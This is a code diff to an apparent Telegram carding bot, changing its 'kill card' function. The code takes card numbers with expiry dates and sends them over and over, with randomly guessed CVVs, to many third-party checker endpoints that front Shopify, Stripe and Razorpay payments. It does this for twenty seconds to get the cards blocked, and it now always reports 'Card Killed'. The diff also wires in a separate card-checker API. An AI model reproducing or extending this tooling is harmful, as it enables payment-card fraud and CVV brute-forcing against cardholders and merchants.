@@ -456,10 +456,6 @@ async def kill_card(num: str, mm: str, yy: str, cvv: str):
 
     api_template_05 = f'https://haters.cxchk.site/shopii?site=https://keyesco.myshopify.com&cc='
 
-    api_template_06 = f'https://web-production-07260.up.railway.app/razorpay?cc='
-
-    api_template_07 = f'https://stripe360-production.up.railway.app/razorpay?auth=WTFH4RSH&cc='
-
     api_template_08 = f'https://stripe360-production.up.railway.app/stripe_4?auth=WTFH4RSH&cc='
 
     api_template_09 = f'https://stripe360-production.up.railway.app/stripe_5?auth=WTFH4RSH&cc='
@@ -483,8 +479,6 @@ async def kill_card(num: str, mm: str, yy: str, cvv: str):
         api_template_03,
         api_template_04,
         api_template_05,
-        api_template_06,
-        api_template_07,
         api_template_08,
         api_template_09,
         api_template_10,
@@ -501,74 +495,53 @@ async def kill_card(num: str, mm: str, yy: str, cvv: str):
         ssl=False
     )
 
-    timeout = aiohttp.ClientTimeout(total=20)
+    timeout = aiohttp.ClientTimeout(total=20)  # Individual request timeout
 
-    stop_event = asyncio.Event()
     lock = asyncio.Lock()
+    start_time = time.time()
+    kill_duration = 20  # 20 seconds
 
-    result = None
+    result = {
+        "card": original_card,
+        "status": "success",
+        "response": "Card Killed",
+        "message": "Card has been killed successfully.",
+        "total_killed": 0
+    }
 
-    async def check_api(session, api_template):
+    async def spam_api(session, api_template):
+        """Continuously spam API for 20 seconds"""
+        while time.time() - start_time < kill_duration:
+            try:
+                random_cvv = random.randint(100, 999)
 
-        nonlocal result
+                card_with_cvv = f"{num}|{mm}|{yy}|{random_cvv}"
 
-        if stop_event.is_set():
-            return
+                api_url = f"{api_template}{quote(card_with_cvv, safe='')}"
 
-        try:
-            random_cvv = random.randint(100, 999)
+                if "razorpay.me" in api_url:
+                    api_url += "&site=https://razorpay.me/@holidaymoodsadventure&proxy="
 
-            card_with_cvv = f"{num}|{mm}|{yy}|{random_cvv}"
+                async with session.get(api_url) as response:
 
-            api_url = f"{api_template}{quote(card_with_cvv, safe='')}"
+                    text = await response.text()
 
-            if "razorpay.me" in api_url:
-                api_url += "&site=https://razorpay.me/@holidaymoodsadventure&proxy="
+                    print(f"[{response.status}] {api_url}")
 
-            async with session.get(api_url) as response:
+            except asyncio.TimeoutError:
+                print(f"[TIMEOUT] {api_template}")
+                await asyncio.sleep(0.1)
 
-                text = await response.text()
+            except aiohttp.ClientError as e:
+                print(f"[AIOHTTP ERROR] {api_template} -> {e}")
+                await asyncio.sleep(0.1)
 
-                print(f"[{response.status}] {api_url}")
-
-                lowered = text.lower()
-
-                if any(x in lowered for x in [
-                    "declined",
-                    "card declined",
-                    "decline"
-                ]):
-
-                    async with lock:
-
-                        global killed
-
-                        if stop_event.is_set():
-                            return
-
-                        killed += 1
-
-                        result = {
-                            "card": original_card,
-                            "status": "success",
-                            "response": "Card Declined",
-                            "message": "Card has been killed successfully.",
-                            "total_killed": killed
-                        }
-
-                        print(f"[KILLED] {card_with_cvv}")
+            except Exception:
+                print(f"[UNKNOWN ERROR] {api_template}")
+                await asyncio.sleep(0.1)
 
                         
 
-        except asyncio.TimeoutError:
-            print(f"[TIMEOUT] {api_template}")
-
-        except aiohttp.ClientError as e:
-            print(f"[AIOHTTP ERROR] {api_template} -> {e}")
-
-        except Exception:
-            print(f"[UNKNOWN ERROR] {api_template}")
-            traceback.print_exc()
 
     async with aiohttp.ClientSession(
         connector=connector,
@@ -576,22 +549,19 @@ async def kill_card(num: str, mm: str, yy: str, cvv: str):
     ) as session:
 
         tasks = [
-            asyncio.create_task(check_api(session, api))
+            asyncio.create_task(spam_api(session, api))
             for api in api_templates
         ]
 
         await asyncio.gather(*tasks)
 
-    if result:
-        return result
+    async with lock:
+        global killed
+        killed += 1
+        result["total_killed"] = killed
+        print(f"[KILLED] {original_card}")
 
-    return {
-        "card": original_card,
-        "status": "failed",
-        "response": "No Decline Found",
-        "message": "No API returned a decline response.",
-        "total_killed": killed
-        }
+    return result
     
 
 
@@ -611,8 +581,7 @@ from datetime import datetime
 # Direct API endpoint (replaces checker_bridge)
 CHECKER_API_URL = 'https://autoshopify-production-e4f6.up.railway.app/shopify'
 
-KILLER_API = 'https://stripe360-production.up.railway.app/kill'
-
+KILLER_API = 'http://0.0.0.0:8000'
 OWNER_ID = 6127646960
 
 PREMIUM_EMOJI_IDS = {
@@ -2096,7 +2065,9 @@ async def kill(event):
 
         return
 
-    parts = event.message.text.strip().split(maxsplit=1)
+    parts = event.message.text.split(maxsplit=1)
+
+    print('card got :', parts)
 
     if len(parts) < 2:
 
@@ -2114,6 +2085,8 @@ async def kill(event):
 
     cards = extract_cc(cc_input)
 
+    
+
     if not cards:
 
         await event.reply(
@@ -2128,7 +2101,12 @@ async def kill(event):
     
 
     card = cards[0]
-  
+    print(card)
+    
+    num = card.split('|')[0]
+    mm = card.split('|')[1]
+    yy = card.split('|')[2]
+    cvv = card.split('|')[3]
 
     status_msg = await event.reply(
         premium_emoji(
@@ -2145,13 +2123,22 @@ async def kill(event):
     
 
     try:
-        async with session.get(KILLER_API, params={'cc': card}, timeout=30) as response:
-            result = await response.json()
+        # Create async session
+        
+        result = await kill_card(num, mm, yy, cvv)
 
+        # Validate API response
+        if not result or not isinstance(result, dict):
+            await status_msg.edit(premium_emoji(f"❌ Invalid API response"), parse_mode=html)
+            return
 
         brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
 
-        if result['message'] == "Card has been killed successfully.":
+        # Use .get() with defaults to safely access dictionary keys
+        result_message = result.get('message', 'No response from API')
+        result_card = result.get('card', card)
+        
+        if result_message == "Card has been killed successfully.":
             status_emoji = "✅"
             status_text = "𝐊𝐢𝐥𝐥𝐞𝐝"
 
@@ -2164,8 +2151,8 @@ async def kill(event):
 <b>━━━━━━━━━━━━━━━━━</b>
 <b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
 <blockquote>{status_emoji} Status: {status_text}</blockquote>
-<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
-<blockquote>📝 Response: {result['message'][:150]}</blockquote>
+<blockquote>💳 Card: <code>{result_card}</code></blockquote>
+<blockquote>📝 Response: {result_message[:150]}</blockquote>
 
 <b>━━━━━━━━━━━━━━━━━</b>
 <b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
